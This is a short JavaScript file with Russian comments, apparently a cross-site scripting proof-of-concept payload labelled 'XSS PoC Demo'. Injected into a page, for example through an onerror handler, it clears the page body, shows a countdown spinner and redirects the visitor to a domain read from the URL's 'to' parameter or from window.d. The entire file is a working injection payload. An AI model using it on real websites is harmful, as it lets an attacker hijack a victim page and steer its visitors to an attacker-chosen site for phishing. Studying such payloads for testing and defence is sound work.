// Обновленный payload с поддержкой URL параметров
(function(){
    // Получаем домен из разных источников по приоритету:
    // 1. Из параметра 'to' в URL (?to=example.com)
    // 2. Из window.d (если установлен в onerror)
    // 3. Значение по умолчанию 'google.com'
    
    var urlParams = new URLSearchParams(window.location.search);
    var domain = urlParams.get('to') || window.d || 'google.com';
    
    // Очищаем возможные слеши
    domain = domain.replace(/^https?:\/\//, '').replace(/\/$/, '');
    
    var redirectUrl = 'https://' + domain;
    
    document.body.innerHTML = '';
    document.body.style.cssText = 'margin:0;padding:0;height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f0;font-family:Arial;';
    
    var html = `
        <div style="text-align:center;padding:20px;background:white;border-radius:10px;box-shadow:0 2px 10px rgba(0,0,0,0.1)">
            <div style="width:60px;height:60px;border:6px solid #e0e0e0;border-top:6px solid #4285f4;border-radius:50%;margin:0 auto 20px;animation:spin 1s linear infinite"></div>
            <h2 style="color:#333;margin:0 0 10px 0">XSS PoC Demo</h2>
            <p style="color:#666;margin:0 0 20px 0">Redirecting to: <strong>${domain}</strong></p>
            <div id="timer" style="font-size:24px;color:#4285f4;font-weight:bold">5</div>
            <style>@keyframes spin {to{transform:rotate(360deg)}}</style>
        </div>
    `;
    
    document.body.innerHTML = html;
    
    var time = 5;
    var timer = setInterval(function() {
        document.getElementById('timer').innerText = --time;
        if (time <= 0) {
            clearInterval(timer);
            window.location.href = redirectUrl;
        }
    }, 1000);
})();
